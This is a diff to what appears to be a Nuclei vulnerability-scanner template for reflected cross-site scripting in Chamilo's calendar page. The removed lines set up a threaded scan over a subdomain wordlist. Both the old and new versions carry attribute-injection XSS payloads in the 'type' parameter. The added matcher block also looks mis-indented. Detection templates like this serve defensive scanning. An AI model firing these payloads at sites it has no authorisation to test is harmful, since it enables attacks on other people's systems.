@@ -8,28 +8,21 @@ info:
   tags: xss,chamilo
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - '{{BaseURL}}/chamilo/main/calendar/agenda_list.php?type=x"%20onmouseover=xss(0x01CE61)%20x="#collapse-personal_1'
+      - '{{BaseURL}}/main/calendar/agenda_list.php?type=x"%20onmouseover=xss(0x01CE61)%20x="#collapse-personal_1'
 
-    raw:
-      - |
-        GET /main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+" HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Accept-Encoding: gzip, deflate
-        Accept: */*
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'agenda_js.php?type=xss" onmouseover=alert(document.domain)'
-      - type: status
-        status:
-          - 200
-      - type: word
-        part: header
-        words:
-          - "text/html"
+matchers-condition: and
+matchers:
+  - type: word
+    part: body
+    words:
+      - "onmouseover%3dxss(0x01CE61)"
+  - type: status
+    status:
+      - 200
+  - type: word
+    part: header
+    words:
+      - "text/html"
